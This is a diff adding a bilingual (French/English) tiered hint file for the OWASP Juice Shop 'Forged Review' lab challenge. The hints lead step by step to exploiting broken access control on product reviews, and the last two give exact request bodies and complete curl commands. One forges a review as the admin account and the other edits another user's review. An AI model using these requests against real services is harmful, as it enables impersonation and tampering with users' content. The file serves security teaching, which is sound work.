@@ -1,0 +1,127 @@
+challenge_key: "forgedReviewChallenge"
+schema_version: "juicelab.hints.v2"
+
+hints:
+  N1:
+    cost_pct: 5
+    text_fr: |
+      Hint OWASP officiel #4 te donne la cle : "This challenge is
+      pretty similar to Post some feedback in another user's
+      name". Si tu as deja resolu forgedFeedback, tu connais le
+      pattern (broken access par client-trusted-input). La
+      difference : Forged Review touche les product reviews
+      (MongoDB) au lieu des feedbacks (SQL).
+    text_en: |
+      Official OWASP hint #4 gives the key: "This challenge is
+      pretty similar to Post some feedback in another user's
+      name". If you've solved forgedFeedback, you know the
+      pattern (broken access via client-trusted-input).
+      Difference: Forged Review targets product reviews (MongoDB)
+      instead of feedbacks (SQL).
+    pedagogical_intent: |
+      Connect to prior knowledge (forgedFeedback) and pivot to MongoDB.
+
+  N2:
+    cost_pct: 10
+    text_fr: |
+      Hint OWASP officiel #2 : "This challenge can be solved by
+      using developers tool of your browser or with tools like
+      postman". Donc deux voies. Pour cette fois, l'angle Postman
+      / Burp est plus pertinent puisque les reviews ne passent pas
+      par un form classique mais par un POST/PATCH JSON. Quel
+      endpoint Juice Shop accepte un body JSON pour les reviews ?
+    text_en: |
+      Official OWASP hint #2: "This challenge can be solved by
+      using developers tool of your browser or with tools like
+      postman". So two ways. This time, the Postman/Burp angle
+      is more relevant since reviews don't go through a classic
+      form but through a JSON POST/PATCH. Which Juice Shop
+      endpoint accepts a JSON body for reviews?
+    pedagogical_intent: |
+      Direct toward API-tampering tooling.
+
+  N3:
+    cost_pct: 20
+    text_fr: |
+      L'endpoint PATCH /rest/products/reviews est utilise pour
+      editer un review. Le body attendu type :
+      { "id": "<reviewId>", "message": "<text>" }
+      Mais le code backend utilise aussi le champ "author" si tu
+      le fournis. Source : codefixes/forgedReviewChallenge fix #2
+      (correct) : "Setting the author on server-side based on the
+      user retrieved from the authentication token... prevents
+      users from just passing any author email they like along
+      with the request". Donc le bug = le code prend l'author du
+      body, pas du JWT.
+    text_en: |
+      The PATCH /rest/products/reviews endpoint is used to edit
+      a review. Expected body shape:
+      { "id": "<reviewId>", "message": "<text>" }
+      But the backend code also uses the "author" field if you
+      provide it. Source: codefixes/forgedReviewChallenge fix #2
+      (correct): "Setting the author on server-side based on the
+      user retrieved from the authentication token... prevents
+      users from just passing any author email they like along
+      with the request". So the bug = code takes author from
+      body, not JWT.
+    pedagogical_intent: |
+      Pin down the specific field exploited (author) with source.
+
+  N4:
+    cost_pct: 35
+    text_fr: |
+      Pour POSTER un review en nom d'un autre, utilise PUT
+      /rest/products/<productId>/reviews avec body :
+      { "message": "Pwn3d!", "author": "admin@juice-sh.op" }
+      Le serveur stocke le review avec author=admin@juice-sh.op
+      meme si ton JWT identifie un autre user.
+      Pour EDITER un review existant, utilise PATCH
+      /rest/products/reviews avec body :
+      { "id": "<reviewId-cible>", "message": "modified" }
+      Le serveur n'ayant pas de check d'ownership sur _id, le
+      review est modifie meme s'il appartient a un autre user.
+    text_en: |
+      To POST a review in another's name, use PUT
+      /rest/products/<productId>/reviews with body:
+      { "message": "Pwn3d!", "author": "admin@juice-sh.op" }
+      Server stores the review with author=admin@juice-sh.op
+      even if your JWT identifies another user.
+      To EDIT an existing review, use PATCH
+      /rest/products/reviews with body:
+      { "id": "<reviewId-target>", "message": "modified" }
+      Server having no ownership check on _id, the review is
+      modified even if owned by another user.
+    pedagogical_intent: |
+      Spell both attack vectors with exact body.
+
+  N5:
+    cost_pct: 50
+    text_fr: |
+      Methode 1 (post avec faux author) :
+      curl -X PUT http://127.0.0.1:3000/rest/products/1/reviews
+        -H "Authorization: Bearer <ton_jwt>"
+        -H "Content-Type: application/json"
+        -d '{"message":"Pwn3d!","author":"admin@juice-sh.op"}'
+      Methode 2 (edit review d'un autre) :
+      curl -X PATCH http://127.0.0.1:3000/rest/products/reviews
+        -H "Authorization: Bearer <ton_jwt>"
+        -H "Content-Type: application/json"
+        -d '{"id":"<reviewId>","message":"H4ck3d"}'
+      Le challenge se valide automatiquement par l'une ou l'autre
+      methode (la description OWASP les liste comme alternatives :
+      "post... or edit").
+    text_en: |
+      Method 1 (post with fake author):
+      curl -X PUT http://127.0.0.1:3000/rest/products/1/reviews
+        -H "Authorization: Bearer <your_jwt>"
+        -H "Content-Type: application/json"
+        -d '{"message":"Pwn3d!","author":"admin@juice-sh.op"}'
+      Method 2 (edit another's review):
+      curl -X PATCH http://127.0.0.1:3000/rest/products/reviews
+        -H "Authorization: Bearer <your_jwt>"
+        -H "Content-Type: application/json"
+        -d '{"id":"<reviewId>","message":"H4ck3d"}'
+      Challenge auto-solves via either method (OWASP description
+      lists them as alternatives: "post... or edit").
+    pedagogical_intent: |
+      Quasi-solution : two complete curl commands.
